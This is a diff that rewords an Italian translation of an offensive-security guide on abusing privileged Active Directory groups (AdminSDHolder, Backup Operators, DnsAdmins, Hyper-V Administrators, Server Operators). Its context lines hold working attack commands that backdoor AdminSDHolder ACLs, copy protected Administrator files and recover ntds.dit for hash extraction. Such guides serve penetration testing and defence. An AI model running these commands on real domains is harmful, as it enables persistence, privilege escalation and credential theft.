@@ -30,7 +30,7 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Uno script è disponibile per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
 Per ulteriori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
@@ -74,7 +74,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Accedere e copiare file da directory riservate, ad esempio:
+3. Accedi e copia file da directory riservate, ad esempio:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
@@ -126,11 +126,11 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Per una dimostrazione pratica, vedere [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Per una dimostrazione pratica, vedere [DEMO VIDEO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un potenziale di sfruttamento significativo.
+I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un potenziale di sfruttamento significativo.
 
 Per elencare i membri del gruppo DnsAdmins, usa:
 ```powershell
@@ -189,7 +189,7 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administrators
 
-Gli Hyper-V Administrators hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controllers virtualizzati. Questo include il clonaggio di DC live ed estraendo gli hash NTLM dal file NTDS.dit.
+Gli Hyper-V Administrators hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controllers virtualizzati. Questo include la clonazione di DC live ed estraendo gli hash NTLM dal file NTDS.dit.
 
 ### Esempio di Sfruttamento
 
@@ -237,7 +237,7 @@ Per le tecniche di sfruttamento relative a **WinRM**, è necessario consultare d
 
 #### Server Operators
 
-Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controllers, inclusi privilegi di backup e ripristino, modifica dell'ora di sistema e spegnimento del sistema. Per enumerare i membri, il comando fornito è:
+Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controllers, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e lo spegnimento del sistema. Per enumerare i membri, il comando fornito è:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
